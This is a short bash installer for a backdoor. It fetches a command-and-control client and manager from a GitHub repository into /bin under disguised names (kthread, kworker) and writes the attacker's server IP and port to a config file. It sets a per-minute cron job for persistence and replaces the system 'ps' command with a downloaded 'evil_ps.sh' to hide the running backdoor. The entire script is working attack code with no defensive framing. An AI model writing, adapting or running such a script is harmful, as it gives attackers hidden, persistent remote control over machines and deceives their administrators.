#!/bin/bash
read -p "Enter server IP: " server_ip
read -p "Enter server port: " server_port
echo "Installing backdoor..."
yum install -y -q python3
curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /bin/kthread
curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /bin/kworker
rm -f /bin/cconf
echo "SERVER_IP = $server_ip" >> /bin/cconf
echo "SERVER_PORT = $server_port" >> /bin/cconf
chmod +x /bin/kworker
chmod +x /bin/kthread
(crontab -l 2>/dev/null; echo "* * * * * /bin/kworker") | crontab -
# https://stackoverflow.com/questions/28836042/how-to-hide-a-shell-script-running-in-the-background-from-ps-ef
mv /bin/ps /bin/pso
curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/evil_ps.sh > /bin/ps
chmod +x /bin/ps
echo "Installation complete. Starting backdoor"
nohup /bin/kworker > /dev/null 2>&1 &
